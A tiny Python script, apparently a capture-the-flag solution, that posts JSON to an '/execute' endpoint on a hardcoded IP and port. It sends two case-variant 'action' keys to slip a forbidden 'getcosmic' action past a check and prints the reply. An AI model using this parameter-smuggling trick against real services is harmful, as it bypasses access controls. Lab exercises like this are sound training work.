import requests 

url = "http://154.57.164.80:30536/execute"
payload = {   
    "action": "getSecureCode",
    "Action": "getcosmic"
 }

r = requests.post(url, json=payload)

print(r.text)
